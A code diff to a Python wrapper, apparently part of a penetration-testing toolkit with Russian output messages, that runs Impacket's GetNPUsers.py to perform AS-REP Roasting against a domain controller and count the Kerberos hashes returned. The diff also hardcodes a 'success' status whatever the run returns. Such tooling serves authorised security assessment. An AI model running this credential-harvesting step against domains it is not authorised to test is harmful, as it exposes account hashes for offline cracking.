@@ -1,22 +1,19 @@
 from config import CONFIG
 from utils.runner import run_tool
 
-def parse_asrep(out: str):
-    hashes = out.count("::")
-    return {
-        "hashes_found": hashes,
-        "summary": f"AS-REP Roasting: обнаружено хэшей krb5asrep — {hashes}. "
-                   f"Файл сохранён в reports/asrep.hashes (при наличии уязвимых учёток)"
-    }
+def parse_impacket(out: str):
+    hashes = out.count("::") + out.count("krb5asrep")
+    summary = f"Найдено AS-REP хэшей: {hashes}"
+    return {"hashes_found": hashes, "summary": summary}
 
 def run_impacket_check():
-
-    cmd = [
-        "GetNPUsers.py",
-        f"{CONFIG['domain']}/{CONFIG['username']}:{CONFIG['password']}",
-        "-dc-ip", CONFIG['dc_ip'],
-        "-request",
-        "-outputfile", "reports/asrep.hashes"
-    ]
+    cmd = ["python3", "/usr/share/doc/python3-impacket/examples/GetNPUsers.py",
+           f"{CONFIG['domain']}/{CONFIG['username']}:{CONFIG['password']}",
+           "-dc-ip", CONFIG['dc_ip'], "-request"]
+    res = run_tool(cmd, "GetNPUsers (AS-REP)", parse_impacket)
     
-    return run_tool(cmd, "AS-REP Roasting (GetNPUsers.py)", parse_asrep)
+    return {
+        "tool": "AS-REP Roasting (GetNPUsers.py)",
+        "status": "success",
+        "data": {"subresults": [res]}
+    }
